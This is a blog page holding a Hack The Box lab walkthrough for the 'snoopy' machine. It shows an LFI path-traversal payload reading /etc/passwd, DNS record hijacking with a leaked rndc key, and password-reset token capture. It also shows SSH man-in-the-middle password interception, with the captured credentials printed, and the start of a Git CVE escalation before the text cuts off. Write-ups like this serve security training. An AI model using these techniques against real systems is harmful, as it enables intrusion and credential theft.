<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="hard - snoopy User Flag Checking ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) 53/tcp open domain ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux) 80/tcp open http nginx 1.18.0 (Ubuntu) HTML Review The most relevant by reading html source code:
http://snoopy.htb/download?file=announcement.pdf It contains a PDF file compressed in a ZIP file The PDF contains this email: pr@snoopy.htb , Sally Brown, SnoopySec http://snoopy.htb/download It contains a video and a PDF with some info: sbrown@snoopy."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="hard - snoopy User Flag Checking ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) 53/tcp open domain ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux) 80/tcp open http nginx 1.18.0 (Ubuntu) HTML Review The most relevant by reading html source code:
http://snoopy.htb/download?file=announcement.pdf It contains a PDF file compressed in a ZIP file The PDF contains this email: pr@snoopy.htb , Sally Brown, SnoopySec http://snoopy.htb/download It contains a video and a PDF with some info: sbrown@snoopy."><meta property="og:title" content><meta property="og:description" content="hard - snoopy User Flag Checking ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) 53/tcp open domain ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux) 80/tcp open http nginx 1.18.0 (Ubuntu) HTML Review The most relevant by reading html source code:
http://snoopy.htb/download?file=announcement.pdf It contains a PDF file compressed in a ZIP file The PDF contains this email: pr@snoopy.htb , Sally Brown, SnoopySec http://snoopy.htb/download It contains a video and a PDF with some info: sbrown@snoopy."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/hard/snoopy/"><meta property="article:section" content="infosec"><title>hard - snoopy </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/hard/snoopy/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=hard---snoopy>hard - snoopy
<a class=heading-link href=#hard---snoopy><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User Flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><h3 id=checking-ports>Checking ports
<a class=heading-link href=#checking-ports><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span></code></pre></div><h3 id=html-review>HTML Review
<a class=heading-link href=#html-review><i class="fa fa-link" aria-hidden=true></i></a></h3><p>The most relevant by reading html source code:</p><ul><li><a href="http://snoopy.htb/download?file=announcement.pdf">http://snoopy.htb/download?file=announcement.pdf</a><ul><li>It contains a PDF file compressed in a ZIP file</li><li>The PDF contains this email:
<a href=../mailto:pr@snoopy.htb>pr@snoopy.htb</a>
, Sally Brown, SnoopySec</li></ul></li><li><a href=http://snoopy.htb/download>http://snoopy.htb/download</a>
It contains a video and a PDF with some info:
<a href=../mailto:sbrown@snoopy.htb>sbrown@snoopy.htb</a></li></ul><p>Interesting links:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#fb660a;font-weight:700>a</span> <span style=color:#ff0086;font-weight:700>href</span>=<span style=color:#0086d2>&#34;blog-details.html&#34;</span> <span style=color:#ff0086;font-weight:700>class</span>=<span style=color:#0086d2>&#34;readmore stretched-link&#34;</span>&gt;&lt;<span style=color:#fb660a;font-weight:700>span</span>&gt;Read More&lt;/<span style=color:#fb660a;font-weight:700>span</span>&gt;&lt;<span style=color:#fb660a;font-weight:700>i</span> <span style=color:#ff0086;font-weight:700>class</span>=<span style=color:#0086d2>&#34;bi bi-arrow-right&#34;</span>&gt;&lt;/<span style=color:#fb660a;font-weight:700>i</span>&gt;&lt;/<span style=color:#fb660a;font-weight:700>a</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#fb660a;font-weight:700>a</span> <span style=color:#ff0086;font-weight:700>href</span>=<span style=color:#0086d2>&#34;contact.html&#34;</span> <span style=color:#ff0086;font-weight:700>class</span>=<span style=color:#0086d2>&#34;btn-get-started&#34;</span>&gt;Get Started&lt;/<span style=color:#fb660a;font-weight:700>a</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#fb660a;font-weight:700>li</span>&gt;&lt;<span style=color:#fb660a;font-weight:700>a</span> <span style=color:#ff0086;font-weight:700>href</span>=<span style=color:#0086d2>&#34;about.html&#34;</span>&gt;About&lt;/<span style=color:#fb660a;font-weight:700>a</span>&gt;&lt;/<span style=color:#fb660a;font-weight:700>li</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#fb660a;font-weight:700>li</span>&gt;&lt;<span style=color:#fb660a;font-weight:700>a</span> <span style=color:#ff0086;font-weight:700>href</span>=<span style=color:#0086d2>&#34;contact.html&#34;</span>&gt;Contact&lt;/<span style=color:#fb660a;font-weight:700>a</span>&gt;&lt;/<span style=color:#fb660a;font-weight:700>li</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#fb660a;font-weight:700>li</span>&gt;&lt;<span style=color:#fb660a;font-weight:700>a</span> <span style=color:#ff0086;font-weight:700>href</span>=<span style=color:#0086d2>&#34;index.html&#34;</span> <span style=color:#ff0086;font-weight:700>class</span>=<span style=color:#0086d2>&#34;active&#34;</span>&gt;Home&lt;/<span style=color:#fb660a;font-weight:700>a</span>&gt;&lt;/<span style=color:#fb660a;font-weight:700>li</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#fb660a;font-weight:700>li</span>&gt;&lt;<span style=color:#fb660a;font-weight:700>a</span> <span style=color:#ff0086;font-weight:700>href</span>=<span style=color:#0086d2>&#34;team.html&#34;</span>&gt;Team&lt;/<span style=color:#fb660a;font-weight:700>a</span>&gt;&lt;/<span style=color:#fb660a;font-weight:700>li</span>&gt;
</span></span></code></pre></div><figure class=image-container><a href=/i/2023-08-21_21-40.png><img width=100% src=/i/2023-08-21_21-40.png alt="Main webpage snoopy.htb"></a><figcaption>&#8213; Main webpage snoopy.htb &#8213;</figcaption></figure><p>Also something interesting, given that the server is listening on port <code>53</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#fb660a;font-weight:700>p</span>&gt;Attention:  As we migrate DNS records to our new domain please be advised that our mailserver &#39;mail.snoopy.htb&#39; is currently offline.&lt;/<span style=color:#fb660a;font-weight:700>p</span>&gt;
</span></span></code></pre></div><h3 id=dns-exploitation>DNS Exploitation
<a class=heading-link href=#dns-exploitation><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Then I just decided to test if the server broadcasts its DNS records, it does:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~➤ dig @snoopy.htb -tAXFR snoopy.htb
</span></span><span style=display:flex><span>; &lt;&lt;&gt;&gt; DiG 9.18.18 &lt;&lt;&gt;&gt; @snoopy.htb -tAXFR snoopy.htb
</span></span><span style=display:flex><span>; (<span style=color:#0086f7;font-weight:700>1</span> server found)
</span></span><span style=display:flex><span>;; global options: +cmd
</span></span><span style=display:flex><span>snoopy.htb.             <span style=color:#0086f7;font-weight:700>86400</span>   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. <span style=color:#0086f7;font-weight:700>2022032612</span> <span style=color:#0086f7;font-weight:700>3600</span> <span style=color:#0086f7;font-weight:700>1800</span> <span style=color:#0086f7;font-weight:700>604800</span> <span style=color:#0086f7;font-weight:700>86400</span>
</span></span><span style=display:flex><span>snoopy.htb.             <span style=color:#0086f7;font-weight:700>86400</span>   IN      NS      ns1.snoopy.htb.
</span></span><span style=display:flex><span>snoopy.htb.             <span style=color:#0086f7;font-weight:700>86400</span>   IN      NS      ns2.snoopy.htb.
</span></span><span style=display:flex><span>ns1.snoopy.htb.         <span style=color:#0086f7;font-weight:700>86400</span>   IN      A       10.0.50.10
</span></span><span style=display:flex><span>ns2.snoopy.htb.         <span style=color:#0086f7;font-weight:700>86400</span>   IN      A       10.0.51.10
</span></span><span style=display:flex><span>mattermost.snoopy.htb.  <span style=color:#0086f7;font-weight:700>86400</span>   IN      A       172.18.0.3
</span></span><span style=display:flex><span>postgres.snoopy.htb.    <span style=color:#0086f7;font-weight:700>86400</span>   IN      A       172.18.0.2
</span></span><span style=display:flex><span>provisions.snoopy.htb.  <span style=color:#0086f7;font-weight:700>86400</span>   IN      A       172.18.0.4
</span></span><span style=display:flex><span>mm.snoopy.htb.          <span style=color:#0086f7;font-weight:700>86400</span>   IN      A       127.0.0.1
</span></span><span style=display:flex><span>www.snoopy.htb.         <span style=color:#0086f7;font-weight:700>86400</span>   IN      A       127.0.0.1
</span></span><span style=display:flex><span>snoopy.htb.             <span style=color:#0086f7;font-weight:700>86400</span>   IN      SOA     ns1.snoopy.htb. ns2.snoopy.htb. <span style=color:#0086f7;font-weight:700>2022032612</span> <span style=color:#0086f7;font-weight:700>3600</span> <span style=color:#0086f7;font-weight:700>1800</span> <span style=color:#0086f7;font-weight:700>604800</span> <span style=color:#0086f7;font-weight:700>86400</span>
</span></span><span style=display:flex><span>;; Query time: <span style=color:#0086f7;font-weight:700>146</span> msec
</span></span><span style=display:flex><span>;; SERVER: 10.10.11.212#53(snoopy.htb) (TCP)
</span></span><span style=display:flex><span>;; WHEN: Mon Aug <span style=color:#0086f7;font-weight:700>21</span> 21:34:30 -04 <span style=color:#0086f7;font-weight:700>2023</span>
</span></span><span style=display:flex><span>;; XFR size: <span style=color:#0086f7;font-weight:700>11</span> records (messages 1, bytes 325)
</span></span></code></pre></div><p>What is that mm.snoopy.htb? Ah Mattermost app:<figure class=image-container><a href=/i/2023-08-21_21-41.png><img width=100% src=/i/2023-08-21_21-41.png alt="Mattermost app"></a><figcaption>&#8213; Mattermost app &#8213;</figcaption></figure></p><h3 id=download-via-lfi>Download via LFI
<a class=heading-link href=#download-via-lfi><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Ok, so that <code>/download</code> is able to download Local files (LFI):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ wget http://snoopy.htb/download?file=....//....//....//....//etc/passwd -O file.zip ; <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>      unzip -f ./*.zip ; <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>      find press* -type f -exec cat {} +
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
</span></span><span style=display:flex><span>sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
</span></span><span style=display:flex><span>clamav:x:1002:1003::/home/clamav:/usr/sbin/nologin
</span></span><span style=display:flex><span>lpelt:x:1003:1004::/home/lpelt:/bin/bash
</span></span><span style=display:flex><span>cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
</span></span><span style=display:flex><span>vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
</span></span><span style=display:flex><span>bind:x:108:113::/var/cache/bind:/usr/sbin/nologin
</span></span><span style=display:flex><span>_laurel:x:999:998::/var/log/laurel:/bin/false
</span></span></code></pre></div><p>There we can see a bunch of users, I guess we will need to pivot between them cbrown, sbrown, lpelt, cshultz, vgray, clamav?.</p><p>Now, I will download <code>/etc/bind/named.config</code>, the following &ldquo;rndc-key&rdquo; should be stored in a separated file.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>include <span style=color:#0086d2>&#34;/etc/bind/named.conf.options&#34;</span>;
</span></span><span style=display:flex><span>include <span style=color:#0086d2>&#34;/etc/bind/named.conf.local&#34;</span>;
</span></span><span style=display:flex><span>include <span style=color:#0086d2>&#34;/etc/bind/named.conf.default-zones&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>key <span style=color:#0086d2>&#34;rndc-key&#34;</span> {
</span></span><span style=display:flex><span>    algorithm hmac-sha256;
</span></span><span style=display:flex><span>    secret <span style=color:#0086d2>&#34;BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=&#34;</span>;
</span></span><span style=display:flex><span>};
</span></span></code></pre></div><h3 id=intercepting-snmp-messages>Intercepting SNMP messages
<a class=heading-link href=#intercepting-snmp-messages><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ python -m smtpd -c DebuggingServer -n 127.0.0.1:25
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~z➤ cat config
</span></span><span style=display:flex><span>key <span style=color:#0086d2>&#34;rndc-key&#34;</span> {
</span></span><span style=display:flex><span>    algorithm hmac-sha256;
</span></span><span style=display:flex><span>    secret <span style=color:#0086d2>&#34;BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=&#34;</span>;
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>~z➤ nsupdate -k config
</span></span><span style=display:flex><span>&gt; server 10.10.11.212 <span style=color:#0086f7;font-weight:700>53</span>
</span></span><span style=display:flex><span>&gt; key hmac-sha256:rndc-key <span style=color:#fb660a>BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA</span>=
</span></span><span style=display:flex><span>&gt; zone snoopy.htb
</span></span><span style=display:flex><span>&gt; update add mail.snoopy.htb <span style=color:#0086f7;font-weight:700>86400</span> A 10.10.14.7
</span></span><span style=display:flex><span>&gt; send
</span></span></code></pre></div><p>Keep in mind, 10.10.11.212 is snoopy.htb and 10.10.14.7 is my own IP.</p><p>Now we proceed to reset
<a href=../mailto:cbrown@snoopy.htb>cbrown@snoopy.htb</a>
password on
<a href=http://mm.snoopy.htb/reset_password>http://mm.snoopy.htb/reset_password</a>
you will get this message captured and get a token:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>b<span style=color:#0086d2>&#39;Reset Your Password&#39;</span>
</span></span><span style=display:flex><span>b<span style=color:#0086d2>&#39;Click the button below to reset your password. If you didn=E2=80=99t reques=&#39;</span>
</span></span><span style=display:flex><span>b<span style=color:#0086d2>&#39;t this, you can safely ignore this email.&#39;</span>
</span></span><span style=display:flex><span>b<span style=color:#0086d2>&#39;&#39;</span>
</span></span><span style=display:flex><span>b<span style=color:#0086d2>&#39;Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Dcqnjz=&#39;</span>
</span></span><span style=display:flex><span>b<span style=color:#0086d2>&#39;gpxjwwqb7exk55sp6sjwkzdu3i8d4x4j3snhihydxkqfnew1o1rx5gq76qb )&#39;</span>
</span></span><span style=display:flex><span>b<span style=color:#0086d2>&#39;&#39;</span>
</span></span><span style=display:flex><span>b<span style=color:#0086d2>&#39;The password reset link expires in 24 hours.&#39;</span>
</span></span><span style=display:flex><span>b<span style=color:#0086d2>&#39;&#39;</span>
</span></span><span style=display:flex><span>b<span style=color:#0086d2>&#39;Questions?&#39;</span>
</span></span></code></pre></div><p>We are now able to login into mm using that token the reset cbrown&rsquo;s password:<figure class=image-container><a href=/i/2023-08-25_10-18.png><img width=100% src=/i/2023-08-25_10-18.png alt="Reset cbrown password"></a><figcaption>&#8213; Reset cbrown password &#8213;</figcaption></figure></p><h3 id=intercetp-ssh-password-by-provisioning-a-server>Intercetp SSH password by provisioning a server
<a class=heading-link href=#intercetp-ssh-password-by-provisioning-a-server><i class="fa fa-link" aria-hidden=true></i></a></h3><p>I notice we have a command that helps us to provision a server via SSH, we can intercept that information.<figure class=image-container><a href=/i/2023-08-25_10-19.png><img width=100% src=/i/2023-08-25_10-19.png alt="Prov a server"></a><figcaption>&#8213; Prov a server &#8213;</figcaption></figure></p><p>We start SSH MITM python tool:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ nohup sudo socat TCP-LISTEN:2222,fork TCP:127.0.0.1:10022 &amp;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~z➤ sudo ./ssh-mitm-x86_64.AppImage server --remote-host snoopy.htb
</span></span><span style=display:flex><span>───────────────────────────────────────────────────────────────────── SSH-MITM - ssh audits made simple ──────────────────────────────────────────────────────────────────────
</span></span><span style=display:flex><span>Version: 3.0.2
</span></span><span style=display:flex><span>License: GNU General Public License v3.0
</span></span><span style=display:flex><span>Documentation: https://docs.ssh-mitm.at
</span></span><span style=display:flex><span>Issues: https://github.com/ssh-mitm/ssh-mitm/issues
</span></span><span style=display:flex><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span style=display:flex><span>generated temporary RSAKey key with <span style=color:#0086f7;font-weight:700>2048</span> bit length and fingerprints:
</span></span><span style=display:flex><span>   MD5:5b:a1:b5:a2:c3:62:5f:c5:9e:7a:4b:21:03:91:fa:81
</span></span><span style=display:flex><span>   SHA256:/DbEweFwI9l3A1Sg509UFYa3PqvunuxHVUEZoIFJaDE
</span></span><span style=display:flex><span>   SHA512:k8DArMtkQjcehr6kIxrFMhPvrgvL0ezJUChiq7aWpqJxYSNzegb567gjKxH40bUHtUDHLHbsH03GpYAaIHJ/8w
</span></span><span style=display:flex><span>listen interfaces 0.0.0.0 and :: on port <span style=color:#0086f7;font-weight:700>10022</span>
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────────── waiting <span style=color:#fb660a;font-weight:700>for</span> connections ───────────────────────────────────────────────────────────────────────────
</span></span></code></pre></div><p>Once we provide a server from MM, we can see the password in the logs:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>[08/25/23 10:36:58] INFO     ℹ session fe324ce5-e93b-4d1a-8a06-91d198f6dd78 created
</span></span><span style=display:flex><span>[08/25/23 10:36:59] INFO     ℹ client information:
</span></span><span style=display:flex><span>                               - client version: ssh-2.0-paramiko_3.1.0
</span></span><span style=display:flex><span>                               - product name: Paramiko
</span></span><span style=display:flex><span>                               - vendor url:  https://www.paramiko.org/
</span></span><span style=display:flex><span>                             ⚠ client audit tests:
</span></span><span style=display:flex><span>                               * client uses same server_host_key_algorithms list <span style=color:#fb660a;font-weight:700>for</span> unknown and known hosts
</span></span><span style=display:flex><span>                               * Preferred server host key algorithm: ssh-ed25519
</span></span><span style=display:flex><span>[08/25/23 10:37:00] INFO     Remote authentication succeeded
</span></span><span style=display:flex><span>                                     Remote Address: snoopy.htb:22
</span></span><span style=display:flex><span>                                     Username: cbrown
</span></span><span style=display:flex><span>                                     Password: sn00pedcr3dential!!!
</span></span><span style=display:flex><span>                                     Agent: no agent
</span></span><span style=display:flex><span>[08/25/23 10:37:01] INFO     ℹ fe324ce5-e93b-4d1a-8a06-91d198f6dd78 - local port forwading
</span></span><span style=display:flex><span>                             SOCKS port: <span style=color:#0086f7;font-weight:700>41275</span>
</span></span><span style=display:flex><span>                               SOCKS4:
</span></span><span style=display:flex><span>                                 * socat: socat TCP-LISTEN:LISTEN_PORT,fork socks4:127.0.0.1:DESTINATION_ADDR:DESTINATION_PORT,socksport=<span style=color:#0086f7;font-weight:700>41275</span>
</span></span><span style=display:flex><span>                                 * netcat: nc -X <span style=color:#0086f7;font-weight:700>4</span> -x localhost:41275 address port
</span></span><span style=display:flex><span>                               SOCKS5:
</span></span><span style=display:flex><span>                                 * netcat: nc -X <span style=color:#0086f7;font-weight:700>5</span> -x localhost:41275 address port
</span></span><span style=display:flex><span>                    INFO     got ssh command: ls -la
</span></span><span style=display:flex><span>[08/25/23 10:37:02] INFO     ℹ fe324ce5-e93b-4d1a-8a06-91d198f6dd78 - session started
</span></span><span style=display:flex><span>                    INFO     got remote command: ls -la
</span></span><span style=display:flex><span>                    INFO     remote command <span style=color:#0086d2>&#39;ls -la&#39;</span> exited with code: <span style=color:#0086f7;font-weight:700>0</span>
</span></span><span style=display:flex><span>                    INFO     ℹ session fe324ce5-e93b-4d1a-8a06-91d198f6dd78 closed
</span></span></code></pre></div><p>And we are now on cbrowns user shell:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>.../p8/snoopy/lfi➤ ssh cbrown@snoopy.htb
</span></span><span style=display:flex><span>cbrown@snoopy.htb&#39;s password:
</span></span><span style=display:flex><span>cbrown@snoopy:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(cbrown) <span style=color:#fb660a>gid</span>=1000(cbrown) <span style=color:#fb660a>groups</span>=1000(cbrown),1002(devops)
</span></span><span style=display:flex><span>cbrown@snoopy:~$ ls
</span></span></code></pre></div><h3 id=exploiting-git-cve>Exploiting Git CVE
<a class=heading-link href=#exploiting-git-cve><i class="fa fa-link" aria-hidden=true></i></a></h3><p>From here we have to pivot into another user account, I think <code>cbrown</code> :evil: (CVE-2023-22490 and CVE-2023-23946)</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>cbrown@snoopy:~$ sudo -l
</span></span><span style=display:flex><span>[sudo] password <span style=color:#fb660a;font-weight:700>for</span> cbrown:
</span></span><span style=display:flex><span>Sorry, try again.
</span></span><span style=display:flex><span>[sudo] password <span style=color:#fb660a;font-weight:700>for</span> cbrown:
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#fb660a;font-weight:700>for</span> cbrown on snoopy:
</span></span><span style=display:flex><span>    <span style=color:#fb660a>env_keep</span>+=<span style=color:#0086d2>&#34;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&#34;</span>, <span style=color:#fb660a>env_keep</span>+=<span style=color:#0086d2>&#34;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&#34;</span>, <span style=color:#fb660a>secure_path</span>=/usr/local/sbin<span style=color:#0086d2>\:</span>/usr/local/bin<span style=color:#0086d2>\:</span>/usr/sbin<span style=color:#0086d2>\:</span>/usr/bin<span style=color:#0086d2>\:</span>/sbin<span style=color:#0086d2>\:</span>/bin, mail_badpass
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User cbrown may run the following commands on snoopy:
</span></span><span style=display:flex><span>    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$
</span></span></code></pre></div><p>Generating a key:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>cbrown@snoopy:~$ ssh-keygen -t rsa
</span></span><span style=display:flex><span>Generating public/private rsa key pair.
</span></span><span style=display:flex><span>Enter file in which to save the key (/home/cbrown/.ssh/id_rsa):
</span></span><span style=display:flex><span>Enter passphrase (empty <span style=color:#fb660a;font-weight:700>for</span> no passphrase):
</span></span><span style=display:flex><span>Enter same passphrase again:
</span></span><span style=display:flex><span>Your identification has been saved in /home/cbrown/.ssh/id_rsa
</span></span><span style=display:flex><span>Your public key has been saved in /home/cbrown/.ssh/id_rsa.pub
</span></span><span style=display:flex><span>The key fingerprint is:
</span></span><span style=display:flex><span>SHA256:yFq39a/ji6BsODGk9MPACg64VBilUiWjslGJuBDdbX4 cbrown@snoopy.htb
</span></span><span style=display:flex><span>The key&#39;s randomart image is:
</span></span><span style=display:flex><span>+---[RSA 3072]----+
</span></span><span style=display:flex><span>|<span style=color:#fb660a>o</span>=<span style=color:#fb660a>O</span>=..           |
</span></span><span style=display:flex><span>|+=++. o          |
</span></span><span style=display:flex><span>|B+.  o           |
</span></span><span style=display:flex><span>|B++ ....E        |
</span></span><span style=display:flex><span>|*+ *  +.S .      |
</span></span><span style=display:flex><span>|o.. *o . o .     |
</span></span><span style=display:flex><span>|    .=  o   .    |
</span></span><span style=display:flex><span>|    o... . ...   |
</span></span><span style=display:flex><span>|     oo   ..++.  |
</span></span><span style=display:flex><span>+----[SHA256]-----+
</span></span></code></pre></div><pre><code>Exploiting Git CVEs:
</code></pre><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>cbrown@snoopy:~$ mkdir repo; cd repo
</span></span><span style=display:flex><span>cbrown@snoopy:~/repo$ git init
</span></span><span style=display:flex><span>hint: Using <span style=color:#0086d2>&#39;master&#39;</span> as the name <span style=color:#fb660a;font-weight:700>for</span> the initial branch. This default branch name
</span></span><span style=display:flex><span>hint: is subject to change. To configure the initial branch name to use in all
</span></span><span style=display:flex><span>hint: of your new repositories, which will suppress this warning, call:
</span></span><span style=display:flex><span>hint:
</span></span><span style=display:flex><span>hint:   git config --global init.defaultBranch &lt;name&gt;
</span></span><span style=display:flex><span>hint:
</span></span><span style=display:flex><span>hint: Names commonly chosen instead of <span style=color:#0086d2>&#39;master&#39;</span> are <span style=color:#0086d2>&#39;main&#39;</span>, <span style=color:#0086d2>&#39;trunk&#39;</span> and
</span></span><span style=display:flex><span>hint: <span style=color:#0086d2>&#39;development&#39;</span>. The just-created branch can be renamed via this command:
